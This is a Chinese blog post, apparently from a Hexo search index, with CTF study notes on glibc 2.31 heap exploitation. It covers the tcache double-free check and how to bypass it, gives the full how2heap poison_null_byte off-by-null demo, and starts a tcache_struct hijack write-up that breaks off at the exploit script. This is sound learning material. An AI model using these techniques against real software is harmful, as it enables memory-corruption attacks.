<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>How2HE4p!</title>
    <link href="/2023/10/31/How2HEAP/"/>
    <url>/2023/10/31/How2HEAP/</url>
    
    <content type="html"><![CDATA[<p>how2heap奥, 看👴干不干你就完🌶️:</p><span id="more"></span><h2 id="0x00">0x00</h2><p>newstar今年week4非常的离奇, 除了一道2.23的doublefree, 那玩意给个勾来都秒了, 剩下全是2.31.</p><blockquote><p>后话是其中一道2.31居然是逆向题, 跟堆毫无关系</p></blockquote><p>踏马的, 看了看我贫瘠的堆题水平, 我发现我几乎就没怎么做过高版本的题, 2.31的水平仅限于最初级的tcache poisoning这种, 痛定思痛, 准备推一下how2heap.</p><p>这篇文章的进度预计是直接从2.31开推, 跟着源码一起看.</p><blockquote><p>以下是本文所用的资源:</p><p>how2heap:<a href="https://github.com/shellphish/how2heap">how2heap</a></p><p>roderick大神的博客:<a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/">Glibc堆利用之house of系列总结 - roderick - record and learn! (roderickchan.cn)</a></p><p>源码网站: <a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2913">malloc.c - malloc/malloc.c - Glibc source code (glibc-2.31) - Bootlin</a></p><p>知乎上的一个专门的2.31的文章:<a href="https://zhuanlan.zhihu.com/p/136983333">Heap Exploit v2.31(zhihu.com)</a>,how2heap仓库下面有一个专门的2.31其实似乎就是这篇文章</p></blockquote><h2 id="0x01-2️⃣-3️⃣1️⃣">0x01 2️⃣.3️⃣1️⃣</h2><p>我们首先从tcache本身的一些东西入手:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><p>2.31中, 我们可以看到原有的<code>tcache_entry</code>结构相较于2.27加了一层保护, 这层保护应用于2.29及以后的版本, 使用了一个key段, 该段位于chunk的bk段,</p><p>然后<code>tcache_put</code>函数中对key段做了一些手脚, 设置其值为tcache结构体的地址:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">tcache_put (mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)<br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br><br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>如注释所说, 这一句话的作用是设置标志位, 将其置于tcache中, 防止double free.</p><p>这个保护在free处是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>      &#123;<br><span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>tcache_entry *e = (tcache_entry *) chunk2mem (p);<br><br><span class="hljs-comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span><br><span class="hljs-comment">   trust it (it also matches random payload data at a 1 in</span><br><span class="hljs-comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span><br><span class="hljs-comment">   coincidence before aborting.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))<br>  &#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE (memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<br> tmp;<br> tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>malloc_printerr (<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>    <span class="hljs-comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="hljs-comment">       few cycles, but don&#x27;t abort.  */</span><br>  &#125;<br><br><span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>  &#123;<br>    tcache_put (p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>我们可以看见, free时当key段是tcache时并不是直接挂掉, 而是通过tmp指针在entry链上逐个检查, 如果tmp指针与e(即chunk)的指针值相等,则认为是double free. 之前的tcache double free相当随意, 但是这个检查的绕过似乎也相当随意, 由于在检查时首先看的是key段, 所以只需要改掉key段即可.</p><p>这属于是最基础层面上的一些东西, 接下来看看how2heap里面的:</p><h3 id="1-1-poison-null-byte">1.1 poison_null_byte</h3><p>源码我还是整段的放一下吧:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to poison null byte!&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Tested in Ubuntu 20.04 64bit.&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Some of the implementation details are borrowed from https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/off_by_null.c\n&quot;</span>);<br><br><span class="hljs-comment">// step1: allocate padding</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step1: allocate a large padding so that the fake chunk&#x27;s addresses&#x27;s lowest 2nd byte is \\x00&quot;</span>);<br><span class="hljs-type">void</span> *tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br><span class="hljs-type">void</span> *heap_base = (<span class="hljs-type">void</span> *)((<span class="hljs-type">long</span>)tmp &amp; (~<span class="hljs-number">0xfff</span>)); <span class="hljs-comment">//页对齐</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap address: %p\n&quot;</span>, heap_base);<br><span class="hljs-type">size_t</span> size = <span class="hljs-number">0x10000</span> - ((<span class="hljs-type">long</span>)tmp&amp;<span class="hljs-number">0xffff</span>) - <span class="hljs-number">0x20</span>; <span class="hljs-comment">//构造个能对到0000的size</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Calculate padding chunk size: 0x%lx\n&quot;</span>, size);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocate the padding. This is required to avoid a 4-bit bruteforce because we are going to overwrite least significant two bytes.&quot;</span>);<br><span class="hljs-type">void</span> *padding= <span class="hljs-built_in">malloc</span>(size);<br><br><span class="hljs-comment">// step2: allocate prev chunk and victim chunk</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep2: allocate two chunks adjacent to each other.&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s call the first one &#x27;prev&#x27; and the second one &#x27;victim&#x27;.&quot;</span>);<br><span class="hljs-type">void</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><span class="hljs-type">void</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev chunk: malloc(0x500) = %p\n&quot;</span>, prev);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;victim chunk: malloc(0x4f0) = %p\n&quot;</span>, victim);<br><br><span class="hljs-comment">// step3: link prev into largebin</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep3: Link prev into largebin&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This step is necessary for us to forge a fake chunk later&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The fd_nextsize of prev and bk_nextsize of prev will be the fd and bck pointers of the fake chunk&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;allocate a chunk &#x27;a&#x27; with size a little bit smaller than prev&#x27;s&quot;</span>);<br><span class="hljs-type">void</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: malloc(0x4f0) = %p\n&quot;</span>, a);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;allocate a chunk &#x27;b&#x27; with size a little bit larger than prev&#x27;s&quot;</span>);<br><span class="hljs-type">void</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: malloc(0x510) = %p\n&quot;</span>, b);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nCurrent Heap Layout\n&quot;</span><br> <span class="hljs-string">&quot;    ... ...\n&quot;</span><br> <span class="hljs-string">&quot;padding\n&quot;</span><br> <span class="hljs-string">&quot;    prev Chunk(addr=0x??0010, size=0x510)\n&quot;</span><br>      <span class="hljs-string">&quot;  victim Chunk(addr=0x??0520, size=0x500)\n&quot;</span><br> <span class="hljs-string">&quot; barrier Chunk(addr=0x??0a20, size=0x20)\n&quot;</span><br> <span class="hljs-string">&quot;       a Chunk(addr=0x??0a40, size=0x500)\n&quot;</span><br> <span class="hljs-string">&quot; barrier Chunk(addr=0x??0f40, size=0x20)\n&quot;</span><br> <span class="hljs-string">&quot;       b Chunk(addr=0x??0f60, size=0x520)\n&quot;</span><br> <span class="hljs-string">&quot; barrier Chunk(addr=0x??1480, size=0x20)\n&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now free a, b, prev&quot;</span>);<br><span class="hljs-built_in">free</span>(a);<br><span class="hljs-built_in">free</span>(b);<br><span class="hljs-built_in">free</span>(prev);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;current unsorted_bin:  header &lt;-&gt; [prev, size=0x510] &lt;-&gt; [b, size=0x520] &lt;-&gt; [a, size=0x500]\n&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocate a huge chunk to enable sorting&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;current large_bin:  header &lt;-&gt; [b, size=0x520] &lt;-&gt; [prev, size=0x510] &lt;-&gt; [a, size=0x500]\n&quot;</span>);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This will add a, b and prev to largebin\nNow prev is in largebin&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The fd_nextsize of prev points to a: %p\n&quot;</span>, ((<span class="hljs-type">void</span> **)prev)[<span class="hljs-number">2</span>]+<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The bk_nextsize of prev points to b: %p\n&quot;</span>, ((<span class="hljs-type">void</span> **)prev)[<span class="hljs-number">3</span>]+<span class="hljs-number">0x10</span>);<br><br><span class="hljs-comment">// step4: allocate prev again to construct fake chunk</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep4: Allocate prev again to construct the fake chunk&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Since large chunk is sorted by size and a&#x27;s size is smaller than prev&#x27;s,&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;we can allocate 0x500 as before to take prev out&quot;</span>);<br><span class="hljs-type">void</span> *prev2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev2: malloc(0x500) = %p\n&quot;</span>, prev2);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now prev2 == prev, prev2-&gt;fd == prev2-&gt;fd_nextsize == a, and prev2-&gt;bk == prev2-&gt;bk_nextsize == b&quot;</span>);<br>assert(prev == prev2);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The fake chunk is contained in prev and the size is smaller than prev&#x27;s size by 0x10&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;So set its size to 0x501 (0x510-0x10 | flag)&quot;</span>);<br>((<span class="hljs-type">long</span> *)prev)[<span class="hljs-number">1</span>] = <span class="hljs-number">0x501</span>;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And set its prev_size(next_chunk) to 0x500 to bypass the size==prev_size(next_chunk) check&quot;</span>);<br>*(<span class="hljs-type">long</span> *)(prev + <span class="hljs-number">0x500</span>) = <span class="hljs-number">0x500</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The fake chunk should be at: %p\n&quot;</span>, prev + <span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;use prev&#x27;s fd_nextsize &amp; bk_nextsize as fake_chunk&#x27;s fd &amp; bk&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we have fake_chunk-&gt;fd == a and fake_chunk-&gt;bk == b&quot;</span>);<br><br><span class="hljs-comment">// step5: bypass unlinking</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep5: Manipulate residual pointers to bypass unlinking later.&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Take b out first by allocating 0x510&quot;</span>);<br><span class="hljs-type">void</span> *b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x510</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Because of the residual pointers in b, b-&gt;fd points to a right now: %p\n&quot;</span>, ((<span class="hljs-type">void</span> **)b2)[<span class="hljs-number">0</span>]+<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We can overwrite the least significant two bytes to make it our fake chunk.\n&quot;</span><br><span class="hljs-string">&quot;If the lowest 2nd byte is not \\x00, we need to guess what to write now\n&quot;</span>);<br>((<span class="hljs-type">char</span>*)b2)[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\x10&#x27;</span>;<br>((<span class="hljs-type">char</span>*)b2)[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;  <span class="hljs-comment">// b-&gt;fd &lt;- fake_chunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After the overwrite, b-&gt;fd is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="hljs-type">void</span> **)b2)[<span class="hljs-number">0</span>]);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;To do the same to a, we can move it to unsorted bin first&quot;</span><br><span class="hljs-string">&quot;by taking it out from largebin and free it into unsortedbin&quot;</span>);<br><span class="hljs-type">void</span> *a2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">free</span>(a2);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now free victim into unsortedbin so that a-&gt;bck points to victim&quot;</span>);<br><span class="hljs-built_in">free</span>(victim);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a-&gt;bck: %p, victim: %p\n&quot;</span>, ((<span class="hljs-type">void</span> **)a)[<span class="hljs-number">1</span>], victim);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Again, we take a out and overwrite a-&gt;bck to fake chunk&quot;</span>);<br><span class="hljs-type">void</span> *a3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br>((<span class="hljs-type">char</span>*)a3)[<span class="hljs-number">8</span>] = <span class="hljs-string">&#x27;\x10&#x27;</span>;<br>((<span class="hljs-type">char</span>*)a3)[<span class="hljs-number">9</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After the overwrite, a-&gt;bck is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="hljs-type">void</span> **)a3)[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">// pass unlink_chunk in malloc.c:</span><br><span class="hljs-comment">//      mchunkptr fd = p-&gt;fd;</span><br><span class="hljs-comment">//      mchunkptr bk = p-&gt;bk;</span><br><span class="hljs-comment">//      if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))</span><br><span class="hljs-comment">//          malloc_printerr (&quot;corrupted double-linked list&quot;);</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And we have:\n&quot;</span><br> <span class="hljs-string">&quot;fake_chunk-&gt;fd-&gt;bk == a-&gt;bk == fake_chunk\n&quot;</span><br> <span class="hljs-string">&quot;fake_chunk-&gt;bk-&gt;fd == b-&gt;fd == fake_chunk\n&quot;</span><br> );<br><br><span class="hljs-comment">// step6: add fake chunk into unsorted bin by off-by-null</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nStep6: Use backward consolidation to add fake chunk into unsortedbin&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Take victim out from unsortedbin&quot;</span>);<br><span class="hljs-type">void</span> *victim2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4f0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, victim2);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;off-by-null into the size of vicim&quot;</span>);<br><span class="hljs-comment">/* VULNERABILITY */</span><br>((<span class="hljs-type">char</span> *)victim2)[<span class="hljs-number">-8</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br><span class="hljs-comment">/* VULNERABILITY */</span><br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now if we free victim, libc will think the fake chunk is a free chunk above victim\n&quot;</span><br><span class="hljs-string">&quot;It will try to backward consolidate victim with our fake chunk by unlinking the fake chunk then\n&quot;</span><br><span class="hljs-string">&quot;add the merged chunk into unsortedbin.&quot;</span><br>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;For our fake chunk, because of what we did in step4,\n&quot;</span><br><span class="hljs-string">&quot;now P-&gt;fd-&gt;bk(%p) == P(%p), P-&gt;bk-&gt;fd(%p) == P(%p)\n&quot;</span><br><span class="hljs-string">&quot;so the unlink will succeed\n&quot;</span>, ((<span class="hljs-type">void</span> **)a3)[<span class="hljs-number">1</span>], prev, ((<span class="hljs-type">void</span> **)b2)[<span class="hljs-number">0</span>], prev);<br><span class="hljs-built_in">free</span>(victim);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;After freeing the victim, the new merged chunk is added to unsorted bin&quot;</span><br><span class="hljs-string">&quot;And it is overlapped with the prev chunk&quot;</span>);<br><br><span class="hljs-comment">// step7: validate the chunk overlapping</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now let&#x27;s validate the chunk overlapping&quot;</span>);<br><span class="hljs-type">void</span> *merged = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;merged: malloc(0x100) = %p\n&quot;</span>, merged);<br><span class="hljs-built_in">memset</span>(merged, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now merged&#x27;s content: %s\n&quot;</span>, (<span class="hljs-type">char</span> *)merged);<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Overwrite prev&#x27;s content&quot;</span>);<br><span class="hljs-built_in">memset</span>(prev2, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;merged&#x27;s content has changed to: %s\n&quot;</span>, (<span class="hljs-type">char</span> *)merged);<br><br>assert(<span class="hljs-built_in">strstr</span>(merged, <span class="hljs-string">&quot;CCCCCCCCC&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>首先第一步, 通过各种手段使得我们真实的利用从后两字节为\x00的地址处开始, 之后先一堆东西, 不知道在做什么</p><p>此时我们把断点下到63行, 观察一下现在堆上的东西</p><p><img src="image-20231024003817588.png" alt="image-20231024003817588"></p><p>此时unsorted中的形式是这样的:</p><p><img src="image-20231024004308565.png" alt="image-20231024004308565"></p><blockquote><p>10.31 先 🕊 🌶</p></blockquote><h2 id="0x02-2️⃣-3️⃣5️⃣">0x02 2️⃣.3️⃣5️⃣</h2><p>没写完 先🕊</p><h2 id="0x03-Othersheap">0x03 Othersheap</h2><blockquote><p>0x03就是 平时刷什么题的时候遇到的有意思的做法 往这里一起写一写</p><p>这个博客是分很多天写的, 逻辑确实很混乱, 但是我觉得还好吧()</p></blockquote><h3 id="1-tcache-struct-hijack">1.tcache_struct hijack</h3><p>例题是ciscn 19年的final3, buu有, 这个题在这里不选择常规的方法, 因为他原本的环境里没有double free的检测</p><p><img src="image-20231031210329468.png" alt="image-20231031210329468"></p><p>每次分配后会给出地址, 这里是唯一输出, 所以首先思路应该是分配到在libc里的一个chunk.</p><p>然后还能看到一个裸的uaf, 如果不用stash可以伪造一个大chunk进unsorted再改</p><blockquote><p>但是我怎么感觉还不如这种方法, 又绕过了检查, <s>又不是那么难想</s></p></blockquote><p>所以在这里:</p><ul><li><p>我们首先是使用stash机制完成double free</p></li><li><p>但是stash需要很多次申请机会, 本身我们就只有24次, 实际上的stash过程就需要用到19次, 直到20th才轮到我们去进行任意地址写</p></li><li><p>故选择劫持 tcache struct, 就是放链表的那个大的结构体</p><ul><li>该结构体在libc2.27中是0x250大小, (后续版本可能有些差别), 前0x40段是count, 后面的是链表头地址</li><li>可以通过这里改count, 改掉这个之后可以达到<strong>不进入tcache</strong>的效果</li><li>由于链表头就在这个chunk里存着, 故可以通过控制这里达到直接控制chunk的效果, 似乎能做到些任意写</li></ul><blockquote><ul><li>这个结构体扔进unsorted之后, 再申请是不切割的(2.27的这个题是这样的), 暂时我还不知道是为什么,</li></ul></blockquote></li></ul><p>后续去搜了搜, 好像有点像个板子(), exp:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 